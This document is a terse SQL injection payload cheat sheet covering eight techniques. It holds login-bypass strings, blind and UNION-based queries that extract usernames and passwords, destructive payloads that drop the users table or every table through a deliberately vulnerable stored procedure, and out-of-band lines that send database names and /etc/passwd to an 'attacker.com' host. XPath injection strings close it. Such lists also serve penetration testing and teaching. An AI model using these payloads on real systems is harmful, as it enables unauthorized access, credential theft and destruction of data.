### 1. Classic SQL Injection

```sql
-- Bypassing login
' OR '1'='1

-- Commenting out the rest of the SQL
' OR '1'='1' --
' OR '1'='1'/*

-- Adding an additional condition
' OR '1'='1' OR 'a'='a
```

### 2. Blind SQL Injection

```sql
-- Boolean-based Blind SQLi
' AND 1=1 --
' AND 1=2 --

-- Time-based Blind SQLi
' AND IF(1=1, SLEEP(5), 'false') --
' AND IF(1=2, SLEEP(5), 'false') --
```

### 3. Error-Based SQL Injection

```sql
-- Extracting database version
' UNION SELECT NULL, NULL, @@version --
' UNION SELECT NULL, NULL, DATABASE() --
```

### 4. Union-Based SQL Injection

```sql
-- Retrieving user information
' UNION SELECT username, password FROM users --
' UNION SELECT NULL, NULL, version() --
```

### 5. Second Order SQL Injection

```sql
-- Injecting payload during registration
admin'); DROP TABLE users; --

-- Triggering the payload later
SELECT * FROM users WHERE username = 'admin';
```

### 6. Out-of-Band SQL Injection

```sql
-- Using DNS exfiltration
' UNION SELECT load_file(CONCAT('\\\\', (SELECT database()), '.attacker.com\\file')) --
' UNION SELECT LOAD_FILE('/etc/passwd') INTO OUTFILE '\\\\attacker.com\\file' --
```

### 7. Stored Procedure SQL Injection

```sql
-- Dynamic execution in stored procedure
CREATE PROCEDURE getUser(@username nvarchar(50))
AS
EXEC('SELECT * FROM users WHERE username = ''' + @username + '''');

-- Exploiting the stored procedure
'; EXEC sp_msforeachtable 'DROP TABLE ?' --
```

### 8. XPath Injection

```xpath
-- Injecting in XPath query
' or '1'='1
' or '1'='1' or 'a'='a
-- Commenting out the rest of the XPath query
' or '1'='1' -- ]
' or '1'='1' /* ]
```
